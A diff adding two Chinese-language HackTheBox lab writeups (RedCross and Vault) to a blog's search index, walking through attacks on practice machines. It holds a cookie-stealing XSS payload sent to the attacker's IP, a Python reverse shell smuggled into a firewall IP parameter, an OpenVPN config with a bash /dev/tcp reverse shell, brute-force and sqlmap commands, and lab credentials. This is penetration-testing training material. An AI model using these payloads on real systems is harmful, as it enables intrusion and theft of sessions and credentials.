@@ -999,6 +999,292 @@ exec.Command() 函数采取了硬编码的“二进制”，“git”，作为�
         
     </entry>
     
+    <entry>
+      <title><![CDATA[HTB靶机渗透实战Writeup_RedCross]]></title>
+      <url>/2019/07/08/HTB%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98Writeup-RedCross/</url>
+      <content type="html"><![CDATA[<figure class="image-box">
+                <img src="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" alt title class>
+                <p></p>
+            </figure>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的靶机：RedCross的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章。</p>
+<h1 id="本文涉及知识点"><a href="#本文涉及知识点" class="headerlink" title="本文涉及知识点:"></a>本文涉及知识点:</h1><p>hydra爆破web登录<br>sql注入<br>xss获取cookie<br>psql基本操作</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>RedCross靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/162" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/162</a><br>目标IP: 10.10.10.113(Linux)<br>本机IP:10.10.14.43(Kali)<br>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>NMAP端口扫描<br><code>nmap -sC -sV -oA  nmap 10.10.10.113</code></p>
+<figure class="image-box">
+                <img src="https://p4.ssl.qhimg.com/t01d95d0c0b6f6c7214.png" alt title class>
+                <p></p>
+            </figure>
+<p>目标主机开放了22、80、443端口，在80、443端口都开放了httpd服务。<br>尝试访问10.10.10.113<br>发现进行了重定向</p>
+<figure class="image-box">
+                <img src="https://p2.ssl.qhimg.com/t01c08bd1fad617085a.png" alt title class>
+                <p></p>
+            </figure>
+<p>使用curl查看 转向至intra.redcross.htb</p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t01fb72e6a1acd16364.png" alt title class>
+                <p></p>
+            </figure>
+<p>添加10.10.10.113 intra.redcross.htb至/etc/hosts<br><code>echo &quot;10.10.10.113 intra.redcross.htb&quot; &gt; /etc/hosts</code><br>成功访问，页面存在登录框，contact页面</p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t01d4bfbcd3523ad775.png" alt title class>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <img src="https://p4.ssl.qhimg.com/t016ed4fec831a8bf34.png" alt title class>
+                <p></p>
+            </figure>
+<p>登陆框可爆破：</p>
+<figure class="image-box">
+                <img src="https://p2.ssl.qhimg.com/t01f08b466e8204cf65.png" alt title class>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <img src="https://p1.ssl.qhimg.com/t0197198166ad6595e0.png" alt title class>
+                <p></p>
+            </figure>
+<h2 id="账户爆破"><a href="#账户爆破" class="headerlink" title="账户爆破"></a>账户爆破</h2><p>使用hydra进行web登录爆破<code>hydra -L /root/ruokoul/darkweb2017-top1000.txt -P /root/ruokoul/darkweb2017-top1000.txt -s 443 10.10.10.113 https-post-form &quot;/pages/actions.php:user=^USER^&amp;pass=^PASS^&amp;action=login:Wrong&quot;</code><br>(抓包可发现，intra使用的是443端口)<br>爆破得出 guest guest 可进行登录</p>
+<figure class="image-box">
+                <img src="https://p1.ssl.qhimg.com/t0195f7fc096d5ecebf.png" alt title class>
+                <p></p>
+            </figure>
+<p>可使用功能为<a href="https://intra.redcross.htb/?o=1&amp;page=app" target="_blank" rel="noopener">https://intra.redcross.htb/?o=1&amp;page=app</a> 进行uid查询</p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t01841a7ac5d0e48e68.png" alt title class>
+                <p></p>
+            </figure>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>o参数存在注入</p>
+<figure class="image-box">
+                <img src="https://p4.ssl.qhimg.com/t01871a604733347089.png" alt title class>
+                <p></p>
+            </figure>
+<p><code>sqlmap -p o -r redcross.req --delay=0.5 –dbs</code></p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t01473e493b8695d089.png" alt title class>
+                <p></p>
+            </figure>
+<p><code>sqlmap -p o -r redcross.req --delay=0.5 –D redcross --tables</code><br>[13:43:41] [INFO] fetching tables for database: ‘redcross’<br>[13:43:42] [INFO] used SQL query returns 3 entries<br>[13:43:44] [INFO] retrieved: ‘messages’<br>[13:43:45] [INFO] retrieved: ‘requests’<br>[13:43:46] [INFO] retrieved: ‘users’<br>对数据库redcross的表进行dump获得部分hash以及提示：</p>
+<figure class="image-box">
+                <img src="https://p1.ssl.qhimg.com/t0107bfe5b675fc743b.png" alt title class>
+                <p></p>
+            </figure>
+<p>hash无利用价值 主要看提示</p>
+<h2 id="分站获取"><a href="#分站获取" class="headerlink" title="分站获取"></a>分站获取</h2><p>多次提到admin webapp 管理平台 根据内容来看应该是子域名，直接尝试admin.redcross.htb<br>添加10.10.10.113 admin.redcross.htb至/etc/hosts<br><code>echo &quot;10.10.10.113 admin.redcross.htb&quot; &gt; /etc/hosts</code><br>访问admin.redcross.htb</p>
+<figure class="image-box">
+                <img src="https://p2.ssl.qhimg.com/t01e7ce50d628bcd0c6.png" alt title class>
+                <p></p>
+            </figure>
+<p>此处使用guest尝试登录 显示权限不足，在intra站内有contact页面可通过XSS获取管理员COOKIEs(靶机网站如果有留言板，一般有xss)，通过尝试xss在email处可使用，获取cookie：<br><code>&lt;script&gt;new Image().src=&#39;http://10.10.14.43/&#39;+document.cookie&lt;/script&gt;</code><br>本地监听<br><code>nc –lvp 80</code><br>留言处插入xss<br>得到cookie</p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t01d08231e66fe5ae3d.png" alt title class>
+                <p></p>
+            </figure>
+<p>PHPSESSID=hi743ili2drfd271v2h0gnj8d7<br>通过修改cookie登录admin.redcross.htb</p>
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>网站内有两个功能：添加一个可登录的用户，IP防火墙</p>
+<figure class="image-box">
+                <img src="https://p3.ssl.qhimg.com/t019fa8aab97bbc1c9c.png" alt title class>
+                <p></p>
+            </figure>
+<p>添加hack用户 密码9m2TxTgI</p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t011b10e8240a730f44.png" alt title class>
+                <p></p>
+            </figure>
+<p>添加可通过ip本机ip以及随意的一个ip</p>
+<figure class="image-box">
+                <img src="https://p4.ssl.qhimg.com/t01ffab3cf9c56db9b8.png" alt title class>
+                <p></p>
+            </figure>
+<p>经过测试在deny功能处的ip参数存在命令注入：<br>通过burp更改数据，进行命令注入，反弹shell：<code>ip=11.11.11.11;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.43&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&amp;id=13&amp;action=deny</code></p>
+<figure class="image-box">
+                <img src="https://p5.ssl.qhimg.com/t0182f02199070cc51d.png" alt title class>
+                <p></p>
+            </figure>
+<p>获取www-data用户权限<br>权限很低，通过对网站内容进行查看</p>
+<h2 id="通过psql获取root权限"><a href="#通过psql获取root权限" class="headerlink" title="通过psql获取root权限"></a>通过psql获取root权限</h2><p>得到psql连接信息<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;”);<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;”);<br>$dbconn = pg_connect(“host=127.0.0.1 dbname=unix user= unixnss password= fios@ew023xnw “);<br>经过连接测试<br>用户unixusrmgr拥有较高的权限。<br>登录psql：<br><code>psql -h 127.0.0.1 -U unixusrmgr -d unix -W</code></p>
+<figure class="image-box">
+                <img src="https://p3.ssl.qhimg.com/t0178e71f09253ed1fb.png" alt title class>
+                <p></p>
+            </figure>
+<p>登录后发现只有passwd_table有访问权限<br>并且passwd_table存在我们之前添加的hack用户的uid、gid、homedir;<br>尝试修改gid=0、homdir=’/root’<br>修改成功<br>使用用户hack进行ssh登录</p>
+<figure class="image-box">
+                <img src="https://p3.ssl.qhimg.com/t01d6301c7d10d02f62.png" alt title class>
+                <p></p>
+            </figure>
+<p>可以看到虽然已经是root的组的了却不能进行敏感文件访问<br>尝试sudo，系统提示当前用户不是sudo组的<br><code>cat /etc/group</code></p>
+<figure class="image-box">
+                <img src="https://p3.ssl.qhimg.com/t01371ef23668f9f2ee.png" alt title class>
+                <p></p>
+            </figure>
+<p>得知sudu组为27<br>杀死用户(修改gid或者其他信息的时候,用户不能被使用)<br>kill -9 <code>lsof -u hack</code><br>修改gid=27<br>并重新登录</p>
+<figure class="image-box">
+                <img src="https://p1.ssl.qhimg.com/t01bef95af8a8a6ecf2.png" alt title class>
+                <p></p>
+            </figure>
+<p>已经可以使用sudo root权限<br>获取root 完成渗透攻击。</p>
+<h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>复盘写writeup时发现一些其他方式：</p>
+<h2 id="获得账号密码"><a href="#获得账号密码" class="headerlink" title="获得账号密码"></a>获得账号密码</h2><p>通过枚举网站目录、文件可获得account_signup.pdf </p>
+<figure class="image-box">
+                <img src="https://p4.ssl.qhimg.com/t017b5a3329e7004fa8.png" alt title class>
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <img src="https://p4.ssl.qhimg.com/t01cf5f0d21fe84d655.png" alt title class>
+                <p></p>
+            </figure>
+<p>得知通过向contact页面输入标题credentials 内容username=admin，便可得到账号密码</p>
+<figure class="image-box">
+                <img src="https://p2.ssl.qhimg.com/t01f24b995e254ef185.png" alt title class>
+                <p></p>
+            </figure>
+<p>相较于爆破账号密码会节省很多时间。</p>
+<h2 id="获取admin站点的cookie"><a href="#获取admin站点的cookie" class="headerlink" title="获取admin站点的cookie"></a>获取admin站点的cookie</h2><p>在上文我们使用的xss获取cookie，经过测试intra站点中的guest的cookie带入至admin站点依旧有效。</p>
+<h2 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h2><p>在我们向防火墙添加本机ip至防火墙之后，再次进行nmap扫描：</p>
+<figure class="image-box">
+                <img src="https://p0.ssl.qhimg.com/t01f78d37d072ac8c22.png" alt title class>
+                <p></p>
+            </figure>
+<p> 可以看到服务器开启了21、22、80、443、1025(HARAKA)、5432(psql)<br>通过1025端口的服务在msf进行<br>exploit/linux/smtp/haraka<br>的使用将得到用户penpelope的shell<br>相较于上文少一个命令注入的过程<br>并且权限也比www-data大一些</p>
+<h1 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h1><p>RedCross是一台更接近于现实的一台机器，它可以有很多路到达root。值得大家去实战练习。</p>
+]]></content>
+      
+        <categories>
+            
+            <category> HTB靶机渗透实战Writeup </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 靶机writeup </tag>
+            
+            <tag> hackthebox </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[HTB靶机渗透实战Writeup_Vault]]></title>
+      <url>/2019/07/07/HTB%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98Writeup-Vault/</url>
+      <content type="html"><![CDATA[<figure class="image-box">
+                <img src="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" alt title class>
+                <p></p>
+            </figure>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的一个靶机：Vault的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章，还望斧正。</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>RedCross靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/161" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/161</a><br>目标IP: 10.10.10.109(Linux)<br>本机IP:10.10.14.43(Kali)<br>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)<br>信息收集<br>NMAP端口扫描<br>nmap -sC -sV -oA  nmap 10.10.10.109</p>
+<p>Nmap scan report for 10.10.10.109<br>Host is up (0.42s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)<br>|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)<br>|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>访问80端口：<br>网站信息</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_33_41_83754" alt title class>
+                <p></p>
+            </figure>
+<p>显示存在平台 sparklays<br>访问10.10.10.109/sparklays<br>403，直接进行目录爆破：</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_33_48_35141" alt title class>
+                <p></p>
+            </figure>
+<p>整理：<br>changelogo.php(可上传图片)</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_33_56_75908" alt title class>
+                <p></p>
+            </figure>
+<p>/uploads/ (为上传文件目录)</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_34_05_65063" alt title class>
+                <p></p>
+            </figure>
+<p>获取反弹shell<br>尝试直接上传PHP文件：<br>失败<br>测试发现是黑名单检测，通过1234.php5绕过限制</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_34_13_70769" alt title class>
+                <p></p>
+            </figure>
+<p>未直接找到地址，<br>我上传的是一个php反弹shell<br>使用nc监听1234端口并访问<br><a href="http://10.10.10.109/sparklays/design/uploads/1234.php5" target="_blank" rel="noopener">http://10.10.10.109/sparklays/design/uploads/1234.php5</a></p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_36_59_97273" alt title class>
+                <p></p>
+            </figure>
+<p>反弹成功获得用户www-data的shell。<br>查看Home目录内并未发现user.txt，发现以下内容：</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_36_06_98456" alt title class>
+                <p></p>
+            </figure>
+<p> DNS + Configurator - 192.168.122.4<br>Firewall - 192.168.122.5<br>The Vault – x<br>dave<br>Dav3therav3123<br>key内容:<br>itscominghome<br>发现主机存在网段192.168.122.x<br>通过ifconfig发现主机网段内ip为192.168.122.1<br>virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49<br>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0<br>发现nc可用 通过nc扫描192.168.122.4开放的端口<br>ifconfig<br>nc -z -v 192.168.122.4 1-100<br>Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!<br>Connection to 192.168.122.4 80 port [tcp/http] succeeded!<br>发现主机开放22、80端口<br>并且之前在目录下发现了ssh用户dave的登录账号密码<br>SSH端口转发<br>通过ssh端口转发并访问本地端口8888(文献参考)<br>ssh -L 8888:192.168.122.4:80 <a href="mailto:dave@10.10.10.109" target="_blank" rel="noopener">dave@10.10.10.109</a></p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_35_48_93640" alt title class>
+                <p></p>
+            </figure>
+<p>访问两个链接发现</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_38_07_99770" alt title class>
+                <p></p>
+            </figure>
+<p>只有vpnconfig可用，但无其他信息，于是继续进行目录爆破<br>通过目录爆破发现/notes目录<br>并且提示有123.ovpn以及一个脚本<br>分别查看</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_38_20_88371" alt title class>
+                <p></p>
+            </figure>
+<p>连接DNS<br>直接使用123.ovpn的内容在vpnconfigurator页面执行<br>remote 192.168.122.1<br>ifconfig 10.200.0.2 10.200.0.1<br>dev tun<br>script-security 2<br>nobind<br>up “/bin/bash -c ‘/bin/bash -i &amp;&gt; /dev/tcp/192.168.122.1/1337 0&gt;&amp;1’”</p>
+<p>ubuntu主机监听1337</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_38_51_97958" alt title class>
+                <p></p>
+            </figure>
+<p>可看到已经获取DNF服务器的root，再次查看/home/dave发现user.txt<br>以及一个ssh账号密码与之前的有差异dav3gerous567<br>user权限拿下。</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_39_13_46502" alt title class>
+                <p></p>
+            </figure>
+<p>获取Root<br>连接Vault<br>在ubantu机子上连接dave的ssh：<br>ssh <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a></p>
+<p>查看文件<br>/etc/hosts<br>发现新ip<br>192.168.5.2<br>在/var/log/auth.log文件中发现有连接的方法</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_42_28_37331" alt title class>
+                <p></p>
+            </figure>
+<p>可通过在DNS主机发现的DAVE凭据去登录192.168.5.2<br>对192.168.5.2进行端口扫描<br>nmap -Pn -sS -sU -T4 -p- 192.168.5.2<br>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2019-03-09 03:57 GMT<br>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers<br>Nmap scan report for Vault (192.168.5.2) Host is up (0.0021s latency).<br>Not shown: 65535 open|filtered ports, 65533 filtered ports<br>PORT STATE SERVICE<br>53/tcp closed domain<br>4444/tcp closed krb524</p>
+<p>通过auto.log得知指定源端口继续扫描可以发现另一个开放端口<br>nmap 192.168.5.2 -Pn –source-port=4444 –f<br>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2019-03-09 03:57 GMT<br>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers<br>Nmap scan report for Vault (192.168.5.2) Host is up (0.0021s latency).<br>Not shown: 65535 open|filtered ports, 65533 filtered ports<br>PORT STATE SERVICE<br>987/tcp open unknown</p>
+<p>按照auto.log的方法操作：<br>ncat -l 5555 –sh-exec “ncat 192.168.5.2 987 -p 53” &amp;<br>netstat -antup<br>使用一个可用端口，在DNS上设置一个ncat侦听器，它将使用提供的源端口触发到Vault的连接。检查主机是否成功监听了该端口。</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_43_17_25963" alt title class>
+                <p></p>
+            </figure>
+<p>已成功<br>并且发现是一个ssh服务 于是我们使用dave的账号登录<br>发现一个root.txt.gpg</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_44_14_25742" alt title class>
+                <p></p>
+            </figure>
+<p>尝试解密gpg失败，没有密钥<br>在DNS机器上也没有密钥<br>在Ubantu主机上发现了相同的ID<br>gpg –list-keys<br>/home/dave/.gnupg/pubring.gpg<br>pub 4096R/0FDFBFE4 2018-07-24<br>uid david<br>sub 4096R/D1EB1F03 2018-07-24</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_44_35_67982" alt title class>
+                <p></p>
+            </figure>
+<p>文件传输<br>使用scp将root.txt.gpg传输至ubantu主机<br>思路：<br>vault &gt; dns &gt; ubantu<br>在DNS主机上执行<br>sudo ncat -l 5555 –sh-exec “ncat 192.168.5.2 987 -p 4444” &amp;</p>
+<p>scp -P 5555 <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a>:/home/dave/root.txt.gpg /tmp<br>在ubantu主机上执行<br>scp <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a>:/tmp/root.txt.gpg .<br>这里需要一个key<br>就是一开始得到的key: itscominghome<br>获得root.txt:</p>
+<figure class="image-box">
+                <img src="http://bbs.08sec.org/upload/images/201907/21_44_51_49197" alt title class>
+                <p></p>
+            </figure>
+
+<p>个人感悟<br>Vault靶机，user.txt获取很简单，只考察一点枚举能力。在root.txt获取上比较麻烦，得找到并理清关系，主机存在Ubantu上，可通过openvpn连接至DNS主机，通过auth.log知道Vault主机，root.txt存在于Vault主机并进行了gpg加密，通过密钥的寻找，确定在ubantu使用key上解密即可得到root.txt<br>文献参考<br>ssh隧道：<a href="https://www.ssh.com/ssh/tunneling/example" target="_blank" rel="noopener">https://www.ssh.com/ssh/tunneling/example</a><br>从OpenVPN配置文件获取反弹shell：<a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank" rel="noopener">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a><br>GPG Keys Cheatsheet：<br><a href="https://easyengine.io/tutorials/linux/gpg-keys" target="_blank" rel="noopener">https://easyengine.io/tutorials/linux/gpg-keys</a><br>scp跨机远程拷贝：<br><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> HTB靶机渗透实战Writeup </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 靶机writeup </tag>
+            
+            <tag> hackthebox </tag>
+            
+        </tags>
+        
+    </entry>
+    
   
   
 </search>
